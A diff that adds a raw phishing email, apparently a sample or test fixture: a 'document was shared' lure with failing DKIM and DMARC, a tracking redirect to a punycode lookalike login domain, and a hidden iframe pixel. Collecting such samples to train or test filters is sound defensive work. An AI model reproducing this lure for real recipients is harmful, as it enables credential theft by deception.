@@ -1,0 +1,23 @@
+Return-Path: <no-reply@track.clickwrap-svc.io>
+Received: from mx1.corp.example.org (mx1.corp.example.org [198.51.100.10])
+ by mail.corp.example.org with ESMTPS id 3K4L5M; Sat, 19 Apr 2025 22:05:09 +0000
+Authentication-Results: mx1.corp.example.org;
+ spf=pass smtp.mailfrom=track.clickwrap-svc.io;
+ dkim=fail header.d=clickwrap-svc.io;
+ dmarc=fail header.from=secure-docs.io
+From: Document Share <notify@secure-docs.io>
+To: stefan@corp.example.org
+Subject: A document was shared with you
+Date: Sat, 19 Apr 2025 22:05:07 +0000
+Message-ID: <share-9921@track.clickwrap-svc.io>
+MIME-Version: 1.0
+Content-Type: text/html; charset="utf-8"
+
+<html><body>
+<p>A document was shared with your address.</p>
+<p><a href="https://track.clickwrap-svc.io/r?url=https%3A%2F%2Fxn--secure-dcs-9db.io%2Flogin%3Fid%3D9921">
+Open document</a></p>
+<p>Or paste this into your browser:
+https://track.clickwrap-svc.io/r?url=https%3A%2F%2Fxn--secure-dcs-9db.io%2Flogin</p>
+<iframe src="https://xn--secure-dcs-9db.io/pixel"></iframe>
+</body></html>
